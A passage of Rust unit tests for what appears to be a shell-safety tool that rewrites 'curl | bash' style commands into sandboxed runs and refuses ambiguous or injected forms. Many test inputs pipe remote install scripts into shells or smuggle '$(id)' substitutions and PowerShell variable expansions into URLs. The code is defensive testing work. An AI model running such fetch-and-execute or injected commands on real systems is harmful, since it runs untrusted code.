            "curl -fsSL 'https://example.com/$(id)' | bash",
            ShellType::Posix,
        )
        .expect("single quotes make the URL bytes literal");
        assert!(
            sc.contains("'https://example.com/$(id)'"),
            "URL must stay single-quoted so $(id) cannot execute: {sc}"
        );
        assert!(
            !sc.replace("'https://example.com/$(id)'", "")
                .contains("$(id)"),
            "no bare $(id) may survive outside the quoted token: {sc}"
        );
        assert_injected_tirith_prefix(&sc, ShellType::Posix);
        assert!(
            sc.contains(" run --capsule --script-stdin --interpreter bash "),
            "{sc}"
        );
        assert!(!sc.contains("/tmp/"), "{sc}");
        assert!(!sc.contains(" && "), "{sc}");
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn dynamic_unquoted_url_is_guidance_only() {
        assert!(pipe_suggestion("curl -fsSL $URL | bash", ShellType::Posix).is_none());
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn carriage_return_host_mutation_is_rejected_not_sanitized() {
        let cmd = "curl -fsSL 'https://exa\rmple.com/install.sh' | bash";
        assert!(pipe_suggestion(cmd, ShellType::Posix).is_none());
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn posix_escaped_space_url_is_rejected_as_non_exact_url() {
        let cmd = r"curl -fsSL https://example.com/a\ b | bash";
        assert!(pipe_suggestion(cmd, ShellType::Posix).is_none());
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn wget_requires_an_explicit_stdout_body_shape() {
        let cmd = "wget -qO- 'https://example.com/$(id)' | sh";
        let v = verdict_with(vec![finding(RuleId::WgetPipeShell)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        let sc = s[0].safe_command.as_deref().unwrap();
        assert!(sc.contains("--interpreter sh"), "{sc}");
        assert!(!sc.contains("wget "), "{sc}");
        assert!(sc.contains("'https://example.com/$(id)'"), "{sc}");
        assert!(
            !sc.replace("'https://example.com/$(id)'", "")
                .contains("$(id)"),
            "no bare $(id) outside the quoted token: {sc}"
        );
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn posix_embedded_single_quote_round_trips() {
        let cmd = r#"curl -fsSL "https://example.com/a'b" | bash"#;
        let sc = pipe_suggestion(cmd, ShellType::Posix).expect("literal URL rewrite");
        assert!(
            sc.contains(r"'https://example.com/a'\''b'"),
            "embedded single quote must be escaped as '\\'': {sc}"
        );
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn supported_shells_are_preserved_as_typed_stdin_interpreters() {
        for (sink, shell) in [
            ("sh", ShellType::Posix),
            ("bash", ShellType::Posix),
            ("zsh", ShellType::Posix),
            ("dash", ShellType::Posix),
            ("ksh", ShellType::Posix),
            ("ash", ShellType::Posix),
            ("fish", ShellType::Fish),
        ] {
            let cmd = format!("curl -fsSL https://example.com/install.sh | {sink}");
            let rewrite = pipe_suggestion(&cmd, shell).expect("supported stdin shell");
            assert!(
                rewrite.contains(&format!("--interpreter {sink}")),
                "{sink}: {rewrite}"
            );
            assert!(rewrite.contains("--script-stdin"), "{sink}: {rewrite}");
        }
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn fish_bare_backslash_escapes_are_always_guidance_only() {
        // Fish gives bare backslashes semantic escape behavior (including
        // control-producing forms). The safe rewriter deliberately declines the
        // entire class instead of maintaining a second, partial Fish parser.
        for word in [
            r"https://example.com/\x61",
            r"https://example.com/\141",
            r"https://example.com/\u0061",
            r"https://example.com/\U00000061",
            r"https://example.com/\e",
            r"https://example.com/\n",
            r"https://example.com/\r",
            r"https://example.com/\0",
            r"https://example.com/\x",
            r"https://example.com/\u12",
            r"https://example.com/\U0000",
            "https://example.com/trailing\\",
            "https://example.com/line\\\ncontinuation",
        ] {
            assert!(
                decode_fish_literal(word).is_none(),
                "Fish bare escape must be refused: {word:?}"
            );
        }
        for word in [
            "https://example.com/\u{1b}",
            "https://example.com/\n",
            "https://example.com/\r",
            "https://example.com/\0",
            "https://example.com/\u{7f}",
        ] {
            assert!(
                decode_fish_literal(word).is_none(),
                "decoded control must be refused: {word:?}"
            );
        }

        assert!(pipe_suggestion(
            r"curl -fsSL https://example.com/\x61 | fish",
            ShellType::Fish
        )
        .is_none());
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn fish_generated_literal_matches_runtime_argv_when_fish_is_installed() {
        let Ok(fish) = crate::trusted_child::resolve_ambient("fish") else {
            eprintln!("skipping: Fish is not installed as a trusted executable");
            return;
        };
        let value = "https://example.com/a b/$(printf nope)?x=*&y=1";
        let encoded = encode_shell_literal(value, ShellType::Fish)
            .expect("single-quoted Fish literal should be representable");
        let script = format!("printf '%s' {encoded}");
        let output = std::process::Command::new(fish.path())
            .args(["-c", &script])
            .output()
            .expect("run Fish argv capture");
        assert!(
            output.status.success(),
            "Fish capture failed: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        assert_eq!(output.stdout, value.as_bytes());
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn posix_shell_s_double_dash_operands_preserve_exact_argv_identity() {
        let operands = [
            "feature",
            "space bearing",
            "embedded'quote",
            "$(printf nope)",
            "semi;colon",
            "and&&separator",
        ];
        let encoded_operands = operands
            .iter()
            .map(|operand| {
                encode_shell_literal(operand, ShellType::Posix).expect("literal POSIX operand")
            })
            .collect::<Vec<_>>()
            .join(" ");
        let expected = std::iter::once("-s".to_string())
            .chain(std::iter::once("--".to_string()))
            .chain(operands.iter().map(|operand| (*operand).to_string()))
            .collect::<Vec<_>>();

        for sink in ["sh", "bash", "zsh", "dash", "ksh", "ash"] {
            let command = format!(
                "curl -fsSL https://example.com/install.sh | {sink} -s -- {encoded_operands}"
            );
            let rewrite = pipe_suggestion(&command, ShellType::Posix)
                .unwrap_or_else(|| panic!("supported {sink} stdin argv"));
            let segments = tokenize::tokenize(&rewrite, ShellType::Posix);
            assert_eq!(segments.len(), 1, "{sink}: {rewrite}");
            let decoded = decode_literal_words(&segments[0].args, ShellType::Posix)
                .unwrap_or_else(|| panic!("decode generated {sink} argv: {rewrite}"));
            let actual = decoded
                .iter()
                .filter_map(|arg| arg.strip_prefix("--interpreter-arg=").map(str::to_string))
                .collect::<Vec<_>>();
            assert_eq!(actual, expected, "{sink}: {rewrite}");
        }
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn unproven_fetcher_body_streams_remain_guidance_only() {
        for (command, rule_id) in [
            (
                "http https://example.com/install.sh | bash",
                RuleId::HttpiePipeShell,
            ),
            (
                "https https://example.com/install.sh | bash",
                RuleId::HttpiePipeShell,
            ),
            (
                "xh https://example.com/install.sh | bash",
                RuleId::XhPipeShell,
            ),
            (
                "fetch https://example.com/install.sh | bash",
                RuleId::PipeToInterpreter,
            ),
        ] {
            let suggestions = suggest(
                command,
                ShellType::Posix,
                &verdict_with(vec![finding(rule_id)]),
            );
            assert!(
                suggestions
                    .iter()
                    .all(|suggestion| suggestion.safe_command.is_none()),
                "unproven fetcher emitted executable output for {command}: {suggestions:?}"
            );
        }
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn unsupported_interpreter_args_remain_guidance_only() {
        assert!(pipe_suggestion(
            "curl -fsSL https://example.com/install.sh | bash -e",
            ShellType::Posix
        )
        .is_none());
        assert!(pipe_suggestion(
            "curl -fsSL https://example.com/install.sh | fish -c 'source'",
            ShellType::Fish
        )
        .is_none());
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn source_or_sink_environment_prefix_is_guidance_only() {
        assert!(pipe_suggestion(
            "HTTPS_PROXY=https://proxy.example curl -fsSL https://example.com/install.sh | bash",
            ShellType::Posix
        )
        .is_none());
        assert!(pipe_suggestion(
            "curl -fsSL https://example.com/install.sh | MODE=feature bash",
            ShellType::Posix
        )
        .is_none());
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn powershell_control_backtick_and_dynamic_expansion_are_rejected() {
        assert!(pipe_suggestion(
            r#"curl -fsSL "https://exa`rmple.com/install.sh" | bash"#,
            ShellType::PowerShell
        )
        .is_none());
        assert!(pipe_suggestion(
            r#"curl -fsSL "https://example.com/$env:PAYLOAD" | bash"#,
            ShellType::PowerShell
        )
        .is_none());
        assert!(decode_powershell_literal(r#""https://example.com/`u{61}""#).is_none());
        assert!(decode_powershell_literal("\u{201c}https://example.com/\u{201d}").is_none());
    }

    // ── archive findings remain guidance-only ──────────────────────────────

    #[test]
    fn archive_command_substitution_path_is_guidance_only() {
        let cmd = "tar -xzf '$(id).tar.gz'";
        let v = verdict_with(vec![finding(RuleId::ArchiveExtract)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        assert!(s[0].safe_command.is_none());
    }

    #[test]
    fn archive_original_extract_is_never_reemitted_as_a_fix() {
        let cmd = "tar -xzf foo.tar.gz -C ~/";
        let v = verdict_with(vec![finding(RuleId::ArchiveExtract)]);
        let s = suggest(cmd, ShellType::Posix, &v);
        assert!(s[0].safe_command.is_none());
    }
}
